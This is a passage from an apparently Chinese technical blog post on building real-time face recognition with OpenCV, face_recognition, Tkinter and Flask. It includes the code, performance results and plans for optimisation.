= time.time()</span><br><span class="line">        <span class="variable language_">self</span>.fps = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        current_time = time.time()</span><br><span class="line">        <span class="variable language_">self</span>.fps = <span class="number">1</span> / (current_time - <span class="variable language_">self</span>.prev_time)</span><br><span class="line">        <span class="variable language_">self</span>.prev_time = current_time</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.fps</span><br></pre></td></tr></table></figure><ul class="lvl-0"><li class="lvl-2"><p>获取当前时间戳 <code>current_time</code>。</p></li><li class="lvl-2"><p>计算当前帧率 <code>self.fps</code></p></li></ul><p>$$<br>fps = {1\over(current_time-self.prev_time)}<br>$$</p><ul class="lvl-0"><li class="lvl-2"><p>更新 <code>self.prev_time</code> 为当前时间戳 <code>current_time</code>。</p></li><li class="lvl-2"><p>返回计算得到的帧率 <code>self.fps</code>。</p></li></ul><h5 id="人脸检测——main-py">人脸检测——<a href="http://main.py">main.py</a></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageTk, ImageDraw</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFont</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Event</span><br><span class="line"><span class="keyword">from</span> camera <span class="keyword">import</span> CameraThread</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> fps <span class="keyword">import</span> FPS</span><br><span class="line"></span><br><span class="line">choose_camera = <span class="number">0</span> <span class="comment"># 选择摄像头，0为内置摄像头，1为外置摄像头</span></span><br><span class="line">min_matching_degree = <span class="number">0.65</span> <span class="comment"># 最小匹配度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------输出文本--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cv2AddChineseText</span>(<span class="params">img, text, position, textColor=(<span class="params"><span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span></span>), textSize=<span class="number">30</span></span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isinstance</span>(img, np.ndarray)): </span><br><span class="line">        img = Image.fromarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))</span><br><span class="line">    </span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    </span><br><span class="line">    fontStyle = ImageFont.truetype(<span class="string">&quot;simsun.ttc&quot;</span>, textSize, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    draw.text(position, text, textColor, font=fontStyle)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------加载模型，初始化摄像头，初始化窗口--------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载opencv Haar Cascade分类器</span></span><br><span class="line">face_cascade = cv2.CascadeClassifier(<span class="string">&#x27;haarcascade_frontalface_default.xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># GUI窗口</span></span><br><span class="line">root = tk.Tk()</span><br><span class="line">root.geometry(<span class="string">&#x27;640x480&#x27;</span>)</span><br><span class="line">root.title(<span class="string">&#x27;人脸识别&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建标签用于显示图像</span></span><br><span class="line">image_label = tk.Label(root)</span><br><span class="line">image_label.pack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 PhotoImage 对象</span></span><br><span class="line">photo = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;trained_model.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    person_encodings, person_names = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 事件对象用于停止线程</span></span><br><span class="line">kill_event = Event()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动摄像头</span></span><br><span class="line">camera_thread = CameraThread(kill_event, src=choose_camera, width=<span class="number">640</span>, height=<span class="number">480</span>)</span><br><span class="line">camera_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化FPS计算</span></span><br><span class="line">fps_calculator = FPS()</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------打开摄像头，开始检测--------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理捕获的图像</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_frame</span>():</span><br><span class="line">    <span class="keyword">global</span> photo</span><br><span class="line">    frame = camera_thread.read()</span><br><span class="line">    frame = cv2.flip(frame, <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换图像格式</span></span><br><span class="line">    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检测人脸</span></span><br><span class="line">    face_locations = face_recognition.face_locations(rgb_frame)</span><br><span class="line">    face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在图像中框出检测到的人脸</span></span><br><span class="line">    <span class="keyword">for</span> (top, right, bottom, left), face_encoding <span class="keyword">in</span> <span class="built_in">zip</span>(face_locations, face_encodings):</span><br><span class="line">        <span class="comment"># 检查人脸是否属于模型中的某个人</span></span><br><span class="line">        matches = face_recognition.compare_faces(person_encodings, face_encoding) <span class="comment"># 比较人脸编码</span></span><br><span class="line">        face_distances = face_recognition.face_distance(person_encodings, face_encoding) <span class="comment"># 计算距离</span></span><br><span class="line">        best_match_index = np.argmin(face_distances) <span class="comment"># 找到最小距离的索引</span></span><br><span class="line">        name = <span class="string">&quot;Unknown&quot;</span> <span class="comment"># 默认为未知人脸</span></span><br><span class="line">        matching_degree = <span class="number">1</span> - face_distances[best_match_index] <span class="comment"># 计算准确率</span></span><br><span class="line">             </span><br><span class="line">        <span class="keyword">if</span> matches[best_match_index] <span class="keyword">and</span> matching_degree &gt; min_matching_degree:</span><br><span class="line">            name = person_names[best_match_index]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 在图像中框出人脸并显示姓名</span></span><br><span class="line">        cv2.rectangle(frame, (left, top), (right, bottom), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line">        frame = cv2AddChineseText(frame, name, (left + (right-left)//<span class="number">2</span> - <span class="number">10</span>, top - <span class="number">30</span>), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算并显示帧率</span></span><br><span class="line">    fps = fps_calculator.update()</span><br><span class="line">    cv2.putText(frame, <span class="string">f&quot;FPS: <span class="subst">&#123;fps:<span class="number">.2</span>f&#125;</span>&quot;</span>, (<span class="number">10</span>, <span class="number">30</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">1</span>, (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将图像转换为PIL Image格式</span></span><br><span class="line">    image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))</span><br><span class="line">    photo = ImageTk.PhotoImage(image)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新标签</span></span><br><span class="line">    image_label.configure(image=photo)</span><br><span class="line">    image_label.image = photo</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理GUI事件，避免程序挂起</span></span><br><span class="line">    root.after(<span class="number">10</span>, update_frame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图像更新循环</span></span><br><span class="line">update_frame()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭程序</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_closing</span>():</span><br><span class="line">    <span class="comment"># 停止摄像头线程</span></span><br><span class="line">    kill_event.<span class="built_in">set</span>()</span><br><span class="line">    camera_thread.join()</span><br><span class="line">    <span class="comment"># 释放摄像头并关闭所有窗口</span></span><br><span class="line">    camera_thread.stream.release()</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line">    <span class="comment"># 关闭Tkinter窗口</span></span><br><span class="line">    root.destroy()</span><br><span class="line">root.protocol(<span class="string">&quot;WM_DELETE_WINDOW&quot;</span>, on_closing)</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure><h5 id="web实现——app-py-index-html">web实现——<a href="http://app.py">app.py</a> &amp; index.html</h5><h6 id="app-py"><a href="http://app.py">app.py</a></h6><p>app.py是main.py使用Flask框架后的后端服务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, Response</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> fps <span class="keyword">import</span> FPS</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">choose_camera = <span class="number">1</span>  <span class="comment"># 选择摄像头，0为内置摄像头，1为外置摄像头</span></span><br><span class="line">min_matching_degree = <span class="number">0.65</span>  <span class="comment"># 最小匹配度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载训练好的模型</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;trained_model.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    person_encodings, person_names = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化摄像头</span></span><br><span class="line">cap = cv2.VideoCapture(choose_camera)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化FPS计算</span></span><br><span class="line">fps_calculator = FPS()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cv2AddChineseText</span>(<span class="params">img, text, position, textColor=(<span class="params"><span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span></span>), textSize=<span class="number">30</span></span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isinstance</span>(img, np.ndarray)): </span><br><span class="line">        img = Image.fromarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))</span><br><span class="line">    </span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    </span><br><span class="line">    fontStyle = ImageFont.truetype(<span class="string">&quot;simsun.ttc&quot;</span>, textSize, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    draw.text(position, text, textColor, font=fontStyle)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_frames</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        success, frame = cap.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            frame = cv2.flip(frame, <span class="number">1</span>)</span><br><span class="line">            rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 使用face_recognition库检测人脸</span></span><br><span class="line">            face_locations = face_recognition.face_locations(rgb_frame)</span><br><span class="line">            face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 在图像中框出检测到的人脸</span></span><br><span class="line">            <span class="keyword">for</span> (top, right, bottom, left), face_encoding <span class="keyword">in</span> <span class="built_in">zip</span>(face_locations, face_encodings):</span><br><span class="line">                matches = face_recognition.compare_faces(person_encodings, face_encoding)</span><br><span class="line">                face_distances = face_recognition.face_distance(person_encodings, face_encoding)</span><br><span class="line">                best_match_index = np.argmin(face_distances)</span><br><span class="line">                name = <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">                matching_degree = <span class="number">1</span> - face_distances[best_match_index]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> matches[best_match_index] <span class="keyword">and</span> matching_degree &gt; min_matching_degree:</span><br><span class="line">                    name = person_names[best_match_index]</span><br><span class="line"></span><br><span class="line">                cv2.rectangle(frame, (left, top), (right, bottom), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line">                frame = cv2AddChineseText(frame, name, (left + (right-left)//<span class="number">2</span> - <span class="number">10</span>, top - <span class="number">30</span>), (<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算并显示帧率</span></span><br><span class="line">            fps = fps_calculator.update()</span><br><span class="line">            cv2.putText(frame, <span class="string">f&quot;FPS: <span class="subst">&#123;fps:<span class="number">.2</span>f&#125;</span>&quot;</span>, (<span class="number">10</span>, <span class="number">30</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">1</span>, (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            ret, buffer = cv2.imencode(<span class="string">&#x27;.jpg&#x27;</span>, frame)</span><br><span class="line">            frame = buffer.tobytes()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">yield</span> (<span class="string">b&#x27;--frame\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Content-Type: image/jpeg\r\n\r\n&#x27;</span> + frame + <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/video_feed&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">video_feed</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(generate_frames(), mimetype=<span class="string">&#x27;multipart/x-mixed-replace; boundary=frame&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h6 id="前端页面index-html">前端页面index.html</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>人脸识别<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>人脸识别<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;video_feed&#x27;) &#125;&#125;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;640&quot;</span> <span class="attr">height</span>=<span class="string">&quot;480&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="四、系统效果">四、系统效果</h3><p>预先使用本人9张照片进行训练</p><table><thead><tr><th>CPU</th><th>i9-14900HX</th></tr></thead><tbody><tr><td>内存</td><td>32GB</td></tr><tr><td>显卡</td><td>RTX4060</td></tr></tbody></table><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/test.png" alt="test"></p><p>平均帧率：2.6</p><p>平均准确率：70％</p><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/match.png" alt="match"></p><h3 id="五、改进历程与不足">五、改进历程与不足</h3><p>在刚开始制作时，并没有使用face-recognition训练模型进行人脸验证，采取的验证手段的为读取文件夹内所有图片，寻找与捕获人脸匹配度更高的图片。发现每次验证都要遍历文件夹内所有图片，严重影响系统性能（以至于卡死），于是对代码进行重构，使用face-recognition训练模型，将捕获的人脸与模型对比，大大缓解了性能问题。同时，由于cv2.VideoCapture的read方法阻塞，性能仍然不佳，搜集资料后采用<a href="https://blog.csdn.net/weixin_43229348/article/details/122688684">一位博主的方法</a>，将这些阻塞 I/O 操作移至单独的线程。</p><p>虽然系统已经能正常运行，但帧率仍然很低，还需要进一步优化。除此之外，目前系统使用的opencv官方提供的分类器 <code>haarcascade_frontalface_default.xml</code> 对于捕获正脸方面较优，但捕获其他方向和复杂表情方面效果很差。需要训练一个新的分类器来适应更复杂的环境。</p><h3 id="六、后续优化">六、后续优化</h3><p>根据实际情况来看，并不需要每一帧都检测人脸，因此可以通过增加检测人脸间隔来提升流畅度。</p><p>大致思路：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">detection_interval = <span class="number">5</span> //间隔帧率</span><br><span class="line">frame_count = <span class="number">0</span> //计算帧率</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_faces</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.kill_event.is_set():</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.frame_count % <span class="variable language_">self</span>.detection_interval == <span class="number">0</span>:</span><br><span class="line">            frame = <span class="variable language_">self</span>.camera_thread.read()</span><br><span class="line">            ...</span><br><span class="line">        <span class="variable language_">self</span>.frame_count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>此外，还可以将人脸检测放到独立的线程中，避免阻塞线程</p><p>结合以上两点，创建新的python文件 <code>FaceDetector.py</code> ，主程序通过在新的线程调用人脸检测来缓解卡顿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FaceDetect.py</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FaceDetector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, camera_thread, detection_interval</span>):</span><br><span class="line">        <span class="variable language_">self</span>.camera_thread = camera_thread</span><br><span class="line">        <span class="variable language_">self</span>.detection_interval = detection_interval</span><br><span class="line">        <span class="variable language_">self</span>.frame_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.face_locations = []</span><br><span class="line">        <span class="variable language_">self</span>.face_encodings = []</span><br><span class="line">        <span class="variable language_">self</span>.kill_event = threading.Event()</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()  <span class="comment"># 添加锁</span></span><br><span class="line">        <span class="variable language_">self</span>.detection_thread = threading.Thread(target=<span class="variable language_">self</span>.detect_faces)</span><br><span class="line">        <span class="variable language_">self</span>.detection_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">detect_faces</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.kill_event.is_set():</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.frame_count % <span class="variable language_">self</span>.detection_interval == <span class="number">0</span>:</span><br><span class="line">                frame = <span class="variable language_">self</span>.camera_thread.read()</span><br><span class="line">                rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span><br><span class="line">                face_locations = face_recognition.face_locations(rgb_frame)</span><br><span class="line">                face_encodings = face_recognition.face_encodings(rgb_frame, <span class="variable language_">self</span>.face_locations)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">with</span> <span class="variable language_">self</span>.lock:  <span class="comment"># 使用锁保护共享数据</span></span><br><span class="line">                    <span class="variable language_">self</span>.face_locations = face_locations</span><br><span class="line">                    <span class="variable language_">self</span>.face_encodings = face_encodings</span><br><span class="line">            <span class="variable language_">self</span>.frame_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.kill_event.<span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.detection_thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_faces</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:  <span class="comment"># 使用锁保护共享数据</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.face_locations, <span class="variable language_">self</span>.face_encodings</span><br></pre></td></tr></table></figure><p><a href="http://xn--main-486fx14i.py">修改main.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#main.py </span></span><br><span class="line"></span><br><span class="line">detection_interval = <span class="number">20</span> <span class="comment"># 人脸检测间隔</span></span><br><span class="line"><span class="comment"># 添加初始化人脸检测</span></span><br><span class="line">face_detector = FaceDetector(camera_thread, detection_interval)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_frame</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;替换</span></span><br><span 